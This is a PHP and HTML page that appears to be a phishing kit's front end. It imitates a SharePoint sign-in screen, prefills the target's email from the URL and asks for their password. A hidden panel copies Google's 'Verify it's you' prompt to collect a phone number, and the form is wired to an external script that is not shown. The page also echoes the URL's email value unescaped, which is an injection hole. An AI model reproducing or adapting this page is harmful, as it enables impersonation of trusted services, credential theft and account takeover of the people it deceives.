<?php 
	$email = $_GET['email'];
	if(empty($email)){
		return false;
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>Login into your sharepoint account</title>
	<link rel="icon" type="icon" href="icon.ico">
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
	<style type="text/css">
		body{
			background: #0073C6;
		}

		.container{
			width:100%;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
		}

		.office{
			width: 380px;
			background: #fff;
		}

		.office-holder{
			width:80%;
			margin: auto;
			padding: 20px 0px;
		}

		.logo{
			width:100%;
			float: left;
			margin-bottom: 2em;
		}

		.logo h1{
			font-family: arial;
		}

		.verify{
			width: 70%;
			margin: auto;
		}

		.verify h4{
			font-family: arial;
		}

		fieldset{
			width: 90%;
			float: right;
			border:2px solid #4285f4;
			border-radius: 5px;
		}

		legend{
			font-size: 15px;
			overflow: hidden;
			width: 42%;
			padding:0px 2px;
			margin: 0px;
		}

		.verify input[type='text']{
			width: 100%;
			float: right;
			border:none;
			padding:3px 10px;
		}

		.verify button{
			border:none;
			height: 40px;
			width: 80px;
			float: right;
			margin-top: 2em;
			background: #4285f4;
			border-radius: 5px;
			color: #fff;
		}

		.email-to-verify{
			border:1px solid #000;
			border-radius: 10px;
		}

		.form-holder{
			width:100%;
			float: left;
		}

		.form-holder h3{
			font-weight: 600;
		}

		.form-holder input[type='email'], input[type='password']{
			width: 100%;
			height:40px;
			float: left;
			margin-bottom: 15px;
		}
		.form-holder .btn-holder{
			width:100%;
			margin-top:1em;
			display: flex;
			align-content: center;
			align-items: center;
			justify-content: center;
		}

		.form-holder .btn-holder .btn{
			background:#0073C6;
			border:none;
			padding:6px 10px;
			color:#fff;
			border-radius: 0px;
			margin-top: 20px;
			margin-bottom: 20px;
		}

		.form-holder .btn-holder .btn:hover{
			cursor:pointer;
		}

		.checkbox{
			width: 100%;
			float: left;
			margin-top:5px;
		}

		.checkbox label{
			font-family:arial;
			font-size:13px;
			float: left;
			margin-left:1em;
		}

		.hide{
			display: none;
		}
	</style>
</head>
<body onload="checkMail()">
	<div class="container">
		<div class="office hide" id="verify" style="border: 1px solid #eee; border-radius: 5px; padding:50px 0px; width: 400px;">
			<div class="verify" style="text-align: center;">
				<div style="width: 100%; margin-bottom: 10px;">
					<img src="google.png" width="100px">
				</div>
				<div style="width: 100%;">
					<div class="alert alert-danger hide alert1"></div>
				</div>
				<h4>Verify it's you</h4>
				<p>This device isn't recognized. For your security, Google wants to make sure it's really you</p>
			</div>
			<div class="verify">
				<div class="email-to-verify" style="margin-bottom: 5px; text-align: center;"></div>
				<p style="font-size:13px; float: left; margin-top: 12px; margin-bottom:26px;">Confirm the phone number you provided in your security settings</p>
			</div>
			<div class="verify">						
				<fieldset>
					<legend>Phone number</legend>
					<input type="text" id="phone-no" name="phone">
				</fieldset>
				<button id="next">Next</button>
			</div>
		</div>
		<div class="office show border shadow bg-light" id="others">
			<div class="office-holder">
				<div class="logo">
					<h3 class="text-dark"><strong id="domain-name" class="text-uppercase"></strong></h3>
					<h5 class="font-weight-light">Please sign using your email and password to gain access</h5>
				</div>
				<form>
					<div class="form-holder">
						<div style="width: 100%;">
							<div class="alert alert-danger hide alert2"></div>
						</div>
						<input type="email" id="email" class="form-control" value="<?php echo $email; ?>" oninput="checkMail()" placeholder="someone@example.com" required="" disabled>
						<input type="password" id="password" placeholder="Password" class="form-control" required="">
						<div class="checkbox">
							<input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
							<label>REMEMBER ME</label>
						</div>
						<div class="btn-holder">
							<button class="btn btn-lg col-12" id="signin">LOGIN</button>
						</div>
						<p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
						<p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
					</div>
				</form>
			</div>
		</div>
	</div>
	<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<script src="js/data.js"></script>
</body>
</html>